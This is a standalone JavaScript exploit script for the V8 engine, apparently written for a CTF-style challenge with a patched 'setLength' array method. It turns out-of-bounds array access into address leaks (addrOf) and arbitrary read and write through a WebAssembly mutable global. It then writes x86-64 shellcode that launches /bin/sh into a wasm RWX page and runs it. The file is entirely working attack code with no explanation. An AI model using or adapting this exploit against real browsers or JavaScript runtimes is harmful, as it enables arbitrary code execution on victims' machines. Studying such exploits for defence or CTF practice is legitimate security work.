function dp(x) {} 
// function dp(x) {%DebugPrint(x);} // const print = console.log;
const print = (x) =>{console.log(x)};
class Helpers {
    constructor() {
      this.cvt_buf = new ArrayBuffer(8);
      this.cvt_f64a = new Float64Array(this.cvt_buf);
      this.cvt_u64a = new BigUint64Array(this.cvt_buf);
      this.cvt_u32a = new Uint32Array(this.cvt_buf);
    }

    ftoi(f) {
      this.cvt_f64a[0] = f;
      return this.cvt_u64a[0];
    }

    itof(i) {
      this.cvt_u64a[0] = i;
      return this.cvt_f64a[0];
    }

    ftoil(f) {
      this.cvt_f64a[0] = f;
      return this.cvt_u32a[0];
    }

    ftoih(f) {
      this.cvt_f64a[0] = f;
      return this.cvt_u32a[1];
    }

    fsetil(f, l) {
      this.cvt_f64a[0] = f;
      this.cvt_u32a[0] = l;
      return this.cvt_f64a[0];
    }

    fsetih(f, h) {
      this.cvt_f64a[0] = f;
      this.cvt_u32a[1] = h;
      return this.cvt_f64a[0];
    }

    isetltof(i, l) {
      this.cvt_u64a[0] = i;
      this.cvt_u32a[0] = l;
      return this.cvt_f64a[0];
    }

    isethtof(i, h) {
      this.cvt_u64a[0] = i;
      this.cvt_u32a[1] = h;
      return this.cvt_f64a[0];
    }

    isetlhtof(l,h){
        this.cvt_u32a[0] = l;
        this.cvt_u32a[1] = h;
        return this.cvt_f64a[0];
    }

    isetltoi(i,l){
      this.cvt_u32a[0] = l;
      return this.cvt_u64a[0];
    }

    isethtoi(i,h){
      this.cvt_u32a[1] = h;
      return this.cvt_u64a[0];
    }

    isetlhtoi(l,h){
        this.cvt_u32a[0] = l;
        this.cvt_u32a[1] = h;
        return this.cvt_u64a[0];
    }

    igetl(i) {
      this.cvt_u64a[0] = i;
      return this.cvt_u32a[0];
    }

    igeth(i) {
      this.cvt_u64a[0] = i;
      return this.cvt_u32a[1];
    }

    gc() {
      for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x1000000);
      }
    }
    printhex(s, val) {
      //%DebugPrint(s + " 0x" + val.toString(16));
      console.log(s + " 0x" + val.toString(16));
      //document.write(s +' ' + val.toString(16) + " </br>");
      //alert(s + " 0x" + val.toString(16));
    }
};

var helper = new Helpers();


var oob_arr = [1.1, 2.2, 3.3];
var buf = new ArrayBuffer(0x100);
var i64arr= new BigUint64Array(buf);

var fake_imported_mutable_globals_arr = [0x1337133713371337];
var leaker = { 'x':fake_imported_mutable_globals_arr};

var wasm_code = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x09,0x02,0x60,0x00,0x01,0x7e,0x60,0x01,0x7e,0x00,0x02,0x0e,0x01,0x02,0x6a,0x73,0x06,0x67,0x6c,0x6f,0x62,0x61,0x6c,0x03,0x7e,0x01,0x03,0x03,0x02,0x00,0x01,0x07,0x19,0x02,0x09,0x67,0x65,0x74,0x47,0x6c,0x6f,0x62,0x61,0x6c,0x00,0x00,0x09,0x73,0x65,0x74,0x47,0x6c,0x6f,0x62,0x61,0x6c,0x00,0x01,0x0a,0x0d,0x02,0x04,0x00,0x23,0x00,0x0b,0x06,0x00,0x20,0x00,0x24,0x00,0x0b,0x00,0x14,0x04,0x6e,0x61,0x6d,0x65,0x02,0x07,0x02,0x00,0x00,0x01,0x01,0x00,0x00,0x07,0x04,0x01,0x00,0x01,0x67])
var wasm_mod = new WebAssembly.Module(wasm_code); 
const global = new WebAssembly.Global({value:'i64', mutable:true}, 0n);
var wasm_instance = new WebAssembly.Instance(wasm_mod, {js:{global}}); 

var getGlobal= wasm_instance.exports.getGlobal;
var setGlobal= wasm_instance.exports.setGlobal;


function arbWrite(addr,val){
    oob_arr[0x17] = helper.itof(addr);
    setGlobal(BigInt.asUintN(64,BigInt(val)));
}

function arbRead(addr){
    oob_arr[0x17] = helper.itof(addr);
    return BigInt.asUintN(64, getGlobal());
}

function addrOf(obj){
    leaker['x'] = obj;
    return BigInt.asUintN(64,js_base + BigInt(helper.ftoih(oob_arr[0x1b])));
}


oob_arr.setLength(0x10000000/8);
dp(oob_arr);
dp(fake_imported_mutable_globals_arr);
dp(leaker);
// %DebugPrint(i64arr);
// %SystemBreak();

oob_arr[0x11] = helper.isethtof(helper.ftoi(oob_arr[0x11]),0x10000000); // length
oob_arr[0x13] = helper.itof(0n); // external_pointer
// %DebugPrint(i64arr);
// %SystemBreak();

// leak js_base
var js_base = 0n;
if( (i64arr[3] >> 32n ) == (i64arr[4] >> 32n)) {
    js_base = BigInt.asUintN(64,i64arr[3]) & 0xffff00000000n;
}
helper.printhex('js_base @', js_base);


fake_imported_mutable_globals_arr_addr = addrOf(fake_imported_mutable_globals_arr);
fake_imported_mutable_globals_addr = fake_imported_mutable_globals_arr_addr - 0x9n;

// %SystemBreak();

oob_arr_addr = addrOf(oob_arr);
wasm_inst_addr = addrOf(wasm_instance);

imported_mutable_globals_offset = (wasm_inst_addr - js_base + 0x50n -1n ) / 8n;

dp(wasm_instance);
// %SystemBreak();

helper.printhex('fake_obj_addr @', fake_imported_mutable_globals_addr);
helper.printhex('oob_arr_addr @', oob_arr_addr);
helper.printhex('wasm_instance_addr @', wasm_inst_addr);
helper.printhex('wasm_instance.imported_mutable_globals_offset ', imported_mutable_globals_offset);

// i64arr[imported_mutable_globals_offset] = helper.isethtoi(i64arr[imported_mutable_globals_offset] , Number(fake_imported_mutable_globals_addr & 0xffffffffn));
// i64arr[imported_mutable_globals_offset + 1n] = helper.isetltoi(i64arr[imported_mutable_globals_offset + 1n], Number(fake_imported_mutable_globals_addr >> 32n));
helper.printhex('i64arr[globals_offset] @', i64arr[imported_mutable_globals_offset]);
i64arr[imported_mutable_globals_offset] = fake_imported_mutable_globals_addr;

dp(wasm_instance);
// %SystemBreak();

var wasm_code2= new Uint8Array([
0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127,
3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0,
5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145,
128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97,
105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0,
65, 42, 11,
]);

var wasm_mod2 = new WebAssembly.Module(wasm_code2);
var wasm_instance2 = new WebAssembly.Instance(wasm_mod2);
var f = wasm_instance2.exports.main;

wasm_instance2_addr = addrOf(wasm_instance2);

wasm_instance2_rwx_page_addr = wasm_instance2_addr + 0x60n - 1n;
helper.printhex('rwx page addr @', wasm_instance2_rwx_page_addr);
// %SystemBreak();
wasm_instance2_rwx_page = arbRead(wasm_instance2_rwx_page_addr);
helper.printhex('rwx page @', wasm_instance2_rwx_page);

shellcode = [0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x00000008,
0x6e69622f, 0x0068732f, 0x89485756, 0x00050fe6];

for(let i=0; i<shellcode.length; i=i+2){
    arbWrite(wasm_instance2_rwx_page +(BigInt(i) * 4n),helper.isetlhtoi(shellcode[i],shellcode[i+1]));
}

// dp(wasm_instance2);
// %SystemBreak();

f();